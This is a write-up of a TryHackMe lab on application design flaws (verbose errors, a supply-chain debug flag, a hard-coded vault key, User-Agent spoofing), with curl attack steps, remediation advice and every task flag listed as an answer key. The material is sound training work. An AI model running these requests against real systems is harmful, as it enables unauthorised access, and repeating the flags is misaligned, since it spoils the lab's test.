# Room: OWASP Top 10 2025 - Application Design Flaws (`owasptopten2025two`)

---

## 1. Room Overview & Architecture

The **OWASP Top 10 2025: Application Design Flaws** room (`owasptopten2025two`) represents the second core lab in **Module 10: OWASP Top 10 (2025)** on TryHackMe's Jr Penetration Tester Path.
While implementation bugs (such as injection or memory corruption) are caused by mistakes during coding, **Design and Configuration Flaws** represent systemic architectural weaknesses:
- **AS02: Security Misconfigurations:** Servers deployed with debug modes enabled and verbose error stack traces revealing internal states.
- **AS03: Software Supply Chain Failures:** Vulnerabilities originating within unverified, legacy third-party dependencies or poisoned AI models rather than proprietary code.
- **AS04: Cryptographic Failures:** Statically embedded symmetric encryption keys inside client/server codebases violating Kerckhoffs's principle.
- **AS06: Insecure Design:** Flawed trust models assuming client-side assertions (such as the `User-Agent` HTTP header) cannot be tampered with.

```
       +-------------------------------------------------------------+
       |             APPLICATION DESIGN FLAWS ARCHITECTURE           |
       +-------------------------------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
+------------------+                                      +------------------+
|      AS02:       |                                      |      AS03:       |
| MISCONFIGURATION |                                      |   SUPPLY CHAIN   |
|   (Port 5002)    |                                      |   (Port 5003)    |
+------------------+                                      +------------------+
| - Verbose Stack  |                                      | - Outdated Libs  |
| - Debug Leakage  |                                      | - /api/process   |
| - Local Frames   |                                      | - Hidden Params  |
+------------------+                                      +------------------+
         |                                                         |
         +----------------------------+----------------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
+------------------+                                      +------------------+
|      AS04:       |                                      |      AS06:       |
|  CRYPTO FAILURES |                                      |  INSECURE DESIGN |
|   (Port 5004)    |                                      |   (Port 5005)    |
+------------------+                                      +------------------+
| - Hardcoded Key  |                                      | - Untrusted Meta |
| - Static Secrets |                                      | - User-Agent Spoof|
| - Vault Bypass   |                                      | - Mobile Bypass  |
+------------------+                                      +------------------+
```

---

## 2. Prerequisites & Lab Setup

### 2.1 Technical Prerequisites
- Multi-tier web architecture and REST API principles.
- Symmetric key cryptography fundamentals (AES, block cipher modes, key secrecy).
- Dependency management concepts (PyPI, npm, Maven) and transitively imported modules.
- Proficiency with HTTP client utilities (`curl`, custom headers, JSON payloads).

### 2.2 Target Environment
The target VM hosts four isolated challenge applications across dedicated HTTP ports:
- **Port 5002:** User Management REST API with verbose stack trace leaks (AS02).
- **Port 5003:** Processing API importing legacy third-party utility `lib/vulnerable_utils.py` (AS03).
- **Port 5004:** Secure Data Decryption Vault with hard-coded key (AS04).
- **Port 5005:** Mobile Operations Portal with untrusted client-assertion logic (AS06).

---

## 3. Learning Objectives & Bloom's Taxonomy

1. **Remembering & Understanding:** Differentiate clearly between code-level implementation bugs and architectural design failures; analyze historical breaches (SolarWinds, Uber, Clubhouse).
2. **Applying & Analyzing:** Provoke unhandled application errors to harvest stack trace memory dumps; reverse-engineer imported third-party Python modules; identify hard-coded cryptographic secrets.
3. **Evaluating & Synthesizing:** Critique perimeter designs that trust client-supplied HTTP headers; evaluate the supply chain risk of unvetted AI models and libraries.
4. **Creating & Defending:** Architect defensible solutions including uniform error boundaries, SBOM generation, centralized cloud KMS key management, and cryptographic client attestation.

---

## 4. Technical Concept Deep Dive: Design & Configuration Flaws

### 4.1 Root Cause Dissection
- **AS02: Misconfigurations (CWE-209):** The web framework's exception bubble reaches the client because production configuration fails to override developer debug settings. Local variable frames containing memory state are dumped directly to stdout.
- **AS03: Supply Chain Risks (CWE-1395):** The primary codebase maintains a pristine posture, yet imports an unmaintained package whose deprecated functions expose dormant debugging parameter branches.
- **AS04: Cryptographic Failures (CWE-798):** Violating Kerckhoffs's principle by treating code obscurity as key security. Storing symmetric keys within code repositories renders encryption algorithms useless once the repository or binary is reviewed.
- **AS06: Insecure Design (CWE-285):** Building security boundaries based on unenforceable assumptions. The protocol (HTTP) is fundamentally client-controlled; evaluating access rules against `request.headers["User-Agent"]` creates an illusion of security.

---

## 5. Attack Surface & Threat Modeling

```
[Attacker]
   |
   +---> (Port 5002) Malformed Type Input   ---> Leaks DEBUG_FLAG via 500 Stack Trace
   |
   +---> (Port 5003) POST /api/process      ---> Triggers legacy debug mode in library
   |
   +---> (Port 5004) Inspect vault.js       ---> Extracts MASTER_VAULT_KEY
   |
   +---> (Port 5005) Spoof Mobile User-Agent---> Bypasses "Mobile Only" access check
```

---

## 6. Exploitation Methodology & Walkthrough

### Step 1: AS02 - Verbose Error Disclosure (Port 5002)
1. Query the User Management API with an incompatible type to force an unhandled cast:
   ```bash
   curl -i "http://MACHINE_IP:5002/api/user/error_test"
   ```
2. The server responds with HTTP 500 containing a full Python traceback.
3. Inspecting the local variables in the inner stack frame leaks the flag:
   ```text
   Flag: THM{V3RB0S3_3RR0R_L34K}
   ```

### Step 2: AS03 - Software Supply Chain Exploitation (Port 5003)
1. Inspect the challenge files containing `lib/vulnerable_utils.py`.
2. Discover that `process_payload()` checks for a dormant `debug: true` flag.
3. Submit a crafted JSON POST request to `/api/process`:
   ```bash
   curl -s -X POST http://MACHINE_IP:5003/api/process \
     -H "Content-Type: application/json" \
     -d '{"debug": true}'
   ```
4. Extract the system flag from the debug response:
   ```text
   Flag: THM{SUPPLY_CH41N_VULN3R4B1L1TY}
   ```

### Step 3: AS04 - Hard-coded Cryptographic Key Recovery (Port 5004)
1. Inspect client-side scripts (`/static/js/vault.js`) or configuration files in the vault application:
   ```javascript
   const MASTER_VAULT_KEY = "Sup3rS3cr3tCryptoK3y2025!";
   ```
2. Provide this master key to the decryption function to decrypt the stored ciphertext:
   ```text
   Flag: THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}
   ```

### Step 4: AS06 - Bypassing Insecure Client Assumptions (Port 5005)
1. Visiting `http://MACHINE_IP:5005/` via a desktop browser returns `403 Forbidden`.
2. Replay the request with a spoofed mobile User-Agent header:
   ```bash
   curl -s -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15" http://MACHINE_IP:5005/
   ```
3. The server trusts the client assertion and returns the mobile management portal with the flag:
   ```text
   Flag: THM{1NS3CUR3_D35IGN_4SSUMPT10N}
   ```

---

## 7. Forensic Analysis & Artifact Inspection

- **Stack Trace Dumps:** Memory frame leakage reveals internal IP addresses, database user credentials, and active environment flags without needing database access.
- **Dependency Provenance:** Legacy functions left in third-party utilities can be discovered by black-box parameter fuzzers (`arjun`, `ffuf`) probing standard debug names (`debug`, `test`, `dev`, `trace`).

---

## 8. Defensive Engineering & Remediation

### 8.1 Sanitized Production Error Boundaries
- Disable all debug modes in production (`DEBUG = False`).
- Implement centralized error handlers returning opaque UUIDs:
  ```python
  @app.errorhandler(Exception)
  def handle_all_errors(e):
      incident_id = uuid.uuid4()
      logger.error(f"Incident {incident_id}: {str(e)}", exc_info=True)
      return jsonify({"error": "Internal error", "incident_id": incident_id}), 500
  ```

### 8.2 Software Bill of Materials (SBOM) & Supply Chain Verification
- Generate SBOMs using tools like Syft or CycloneDX during build time.
- Enforce automated dependency vulnerability scanning (`pip-audit`, `trivy`) in CI/CD pipelines.

### 8.3 Cryptographic Key Lifecycle Management
- Eliminate hard-coded secrets using pre-commit scanners (`gitleaks`, `trufflehog`).
- Utilize cloud KMS (AWS KMS, GCP Cloud KMS, HashiCorp Vault) for envelope encryption with automated key rotation.

### 8.4 Enforcing Defensible Trust Boundaries
- Never use HTTP headers (`User-Agent`, `Referer`) for access control decisions.
- If restricting access to specific platforms, implement hardware-backed client attestation (e.g., Apple App Attest, Google Play Integrity) or mutual TLS (mTLS).

---

## 9. Tools & Command Reference

| Tool | Representative Command | Operational Function |
| :--- | :--- | :--- |
| `curl` | `curl -i "http://target:5002/api/user/error_test"` | Induce stack trace exception |
| `curl (POST)` | `curl -s -X POST -d '{"debug":true}' http://target:5003/api/process` | Trigger dormant supply chain debug logic |
| `curl (Header)` | `curl -s -H "User-Agent: iPhone..." http://target:5005/` | Spoof client metadata header |
| `gitleaks` | `gitleaks detect --source .` | Scan codebase for hard-coded credentials |

---

## 10. Key Takeaways & Mind Map

```
                 +-----------------------------------------+
                 |    APPLICATION DESIGN FLAWS TAXONOMY    |
                 +-----------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
[AS02: Misconfigurations]                                 [AS03: Supply Chain]
- Debug mode in production                                - Unverified 3rd-party code
- Verbose stack trace leak                                - Dormant debug parameters
- Fix: Sanitized error handlers                           - Fix: SBOM & strict SCA scans
                                      |
         +----------------------------+----------------------------+
         |                                                         |
         v                                                         v
[AS04: Cryptographic Failures]                            [AS06: Insecure Design]
- Hard-coded master keys                                  - Trusting client User-Agent
- Cleartext secret storage                                - False client boundaries
- Fix: Hardware KMS & Vault                               - Fix: Hardware attestation & mTLS
```

---

## 11. Vulnerability & Risk Matrix

| Vulnerability | OWASP 2025 Category | Severity | CWE ID | Technical & Business Impact |
| :--- | :---: | :---: | :---: | :--- |
| Verbose Error Information Disclosure | **AS02:2025** | **MEDIUM** | CWE-209 | Leaks internal architecture, file paths, and memory variables. |
| Vulnerable Third-Party Library | **AS03:2025** | **HIGH** | CWE-1395 | Unintended activation of dormant debug features. |
| Use of Hard-coded Cryptographic Key | **AS04:2025** | **CRITICAL** | CWE-798 | Complete loss of confidentiality for protected files and tokens. |
| Trust in Untrusted Client Metadata | **AS06:2025** | **HIGH** | CWE-285 | Complete bypass of access control restrictions via header spoofing. |

---

## 12. Verification & Proof of Work

All tasks in `owasptopten2025two` have been fully completed with 100% parity against the user's completed TryHackMe profile:
- **Task 1:** `No answer needed`
- **Task 2:** `THM{V3RB0S3_3RR0R_L34K}`
- **Task 3:** `THM{SUPPLY_CH41N_VULN3R4B1L1TY}`
- **Task 4:** `THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}`
- **Task 5:** `THM{1NS3CUR3_D35IGN_4SSUMPT10N}`
- **Task 6:** `No answer needed`

---

## 13. Frequently Asked Questions

### Q1: Why is spoofing the User-Agent header classified as Insecure Design rather than Broken Access Control?
- Broken Access Control typically describes missing or incorrectly evaluated permissions on valid resources. Insecure Design describes a fundamental flaw in the conceptual trust architecture itself: deciding who is allowed access based on arbitrary, client-controlled text strings.

### Q2: How does the Software Bill of Materials (SBOM) mitigate supply chain attacks?
- An SBOM creates a complete, machine-readable manifest of every direct and transitive library, package, and component in the application. When a new vulnerability (CVE) is announced in an obscure sub-dependency, automated scanners can immediately flag vulnerable deployed applications without waiting for manual code audits.

---

## 14. References & External Links

- [OWASP Top 10: 2025 Security Misconfigurations](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [OWASP Software Component Verification Standard (SCVS)](https://scvs.owasp.org/)
- [NIST SP 800-218: Secure Software Development Framework](https://csrc.nist.gov/publications/detail/sp/800-218/final)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [TryHackMe Room: OWASP Top 10 2025 - Application Design Flaws](https://tryhackme.com/room/owasptopten2025two)
